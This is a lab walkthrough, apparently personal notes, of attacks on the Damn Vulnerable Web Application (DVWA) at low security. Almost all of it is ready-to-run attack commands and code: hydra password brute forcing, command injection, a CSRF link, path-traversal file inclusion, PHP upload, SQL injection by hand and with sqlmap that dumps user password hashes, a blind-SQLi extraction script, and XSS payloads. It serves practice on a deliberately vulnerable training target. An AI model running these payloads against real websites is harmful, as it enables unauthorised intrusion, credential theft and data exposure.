
### Target

    https://github.com/ethicalhack3r/DVWA

    Security level: low

### Prereq

    # get user token
    $ TOKEN=$(curl -c dvwa.session -s http://192.168.56.101/DVWA/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)

    # get session id
    $ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')

    # log in
    $ curl -L -b "PHPSESSID=${PHPSESSID};security=low" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://192.168.56.101/DVWA/login.php

### Brute Force

    $ wget https://raw.githubusercontent.com/seifreed/dirb/master/wordlists/others/best110.txt

    $ hydra -t 1 -l admin -P best110.txt -vV 192.168.56.101 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=password incorrect:H=Cookie: PHPSESSID=${PHPSESSID};security=low"

### Command Injection

    $ curl -s -b "PHPSESSID=${PHPSESSID};security=low" -d 'ip=;uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    

### CSRF

    # Trick victim (via social engineering means) to visit:
    http://192.168.56.101/DVWA/vulnerabilities/csrf/?password_new=pass1&password_conf=pass1&Change=Change

### File Inclusion

    $ curl -L -b "PHPSESSID=${PHPSESSID};security=low" -v http://192.168.56.101/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php

### File Upload

```
$ cat > b.php <<EOF
<?php phpinfo(); ?>
EOF

$ curl -x 127.0.0.1:8080 -L -b "PHPSESSID=${PHPSESSID};security=low" -F "MAX_FILE_SIZE=100000" -F "uploaded=@b.php;filename=b.php" -F "Upload=Upload" http://192.168.56.101/DVWA/vulnerabilities/upload/index.php

$ curl -s -b "PHPSESSID=${PHPSESSID};security=low" http://192.168.56.101/DVWA/hackable/uploads/b.php | grep Linux
```

### Sql Injection

#### Manual exploitation

    # detecting SQLi
    $ curl -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id='&Submit=Submit"

    # check if injecting into string data
    $ curl -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id='+OR+'1'%3D'1&Submit=Submit"

    # retreiving table names
    $ curl -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id='+union+select+null%2Ctable_name+FROM+information_schema.tables%23&Submit=Submit"

    # retreiving column names for table 'user'
    $ curl -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id='+union+select+null%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name='user'%23&Submit=Submit"

    # retreiving users hashes
    $ curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id='+union+select+Password%2CUser+FROM+users%23&Submit=Submit" | grep union

#### Automated exploitation

    # identify SQLi
    $ wfuzz.py -p 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" -w ~/BUILDS/wfuzz/wordlist/Injections/SQL.txt --ss error "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id=FUZZ&Submit=Submit"

    # confirm SQLi
    $ sqlmap.py --dbms=MySQL --os=Linux --batch --cookie="PHPSESSID=${PHPSESSID};security=low" --technique=U -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id=3&Submit=Submit" -p "id" -t ./sqlmap.log

    # exploit SQLi
    $ sqlmap.py --dbms=MySQL --os=Linux --batch http://127.0.0.1:8080 --cookie="PHPSESSID=${PHPSESSID};security=low" --technique=U -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/index.php?id=3&Submit=Submit" -p "id" -t ./sqlmap-exp.log -s sqlmap.session --dump -T users

### Sql Injection (Blind)

Deps:

    https://stackoverflow.com/questions/296536/how-to-urlencode-data-for-curl-command

#### Manual exploitation

    # detecting (blind) SQLi
    $ curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli_blind/index.php?id=$(rawurlencode "1' and 1=1#")&Submit=Submit" | grep 'User ID' | tail -1
    $ curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/sqli_blind/index.php?id=$(rawurlencode "1' and 1=0#")&Submit=Submit" | grep 'User ID' | tail -1

Exploitation (retreiving DBMS version):

```
$ cat > py.py << EOF
"""
example output of @@version: 5.7.16-0ubuntu0.16.04.1

first find length of the @@version string:
1' and length(@@version)=7#

iterate thru printable ASCII and retreive @@version string
1' and ascii(substring(@@version,1,1))=0x35#
"""

import requests
import string
from urllib import quote, unquote

proxies = {
    "http" : "http://127.0.0.1:8080/"
}

# initiate HTTP session
session = requests.Session()
session.cookies['security'] = 'low'
session.cookies['PHPSESSID'] = 'pjkq87qc7944tu6deo466g32q1'

u = 'http://192.168.56.101/DVWA/vulnerabilities/sqli_blind/index.php?id='

# find length of @@version string
for i in xrange(1, 30):
    payload = "1' and length(@@version)=" + str(i) + "#"
    resp = session.get(u + quote(payload) + "&Submit=Submit", proxies=proxies)

    print "{0}: {1}".format(i, resp.status_code)
    if resp.status_code == 200:
        len = i
        break

version=""

# retreive @@version string
for i in xrange(1, len + 1):
    for c in string.printable:
        payload = "1' and ascii(substring(@@version,{0},1))={1}#".format(i, hex(ord(c)))
        resp = session.get(u + quote(payload) + "&Submit=Submit", proxies=proxies)

        if resp.status_code == 200:
            print payload
            version += c

print version
EOF
```

Trigger:

    $ python py.py

#### Automated exploitation

    # detect (blind) SQLi
    $ sqlmap.py --batch --cookie="PHPSESSID=${PHPSESSID};security=low" --technique=B -u "http://192.168.56.101/DVWA/vulnerabilities/sqli_blind/index.php?id=3&Submit=Submit" -p "id" -t ./sqlmap.log

    # exploitation (retreiving DBMS version) 
    $ sqlmap.py --batch --cookie="PHPSESSID=${PHPSESSID};security=low" --technique=B -u "http://192.168.56.101/DVWA/vulnerabilities/sqli_blind/index.php?id=3&Submit=Submit" -p "id" -t ./sqlmap.log --sql-query="SELECT version();

### XSS (Reflected)

Trigger vulnerability (via browser):

    http://192.168.56.101/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E#

### XSS (Stored)

Inject payload:

    $ curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=low" "http://192.168.56.101/DVWA/vulnerabilities/xss_s/" --data "txtName=xxx&mtxMessage=$(rawurlencode "<script>alert(1)</script>")&btnSign=Sign+Guestbook"

### Bonus 1

    Session fixation - PHPSESSID is not regenerated after logging in
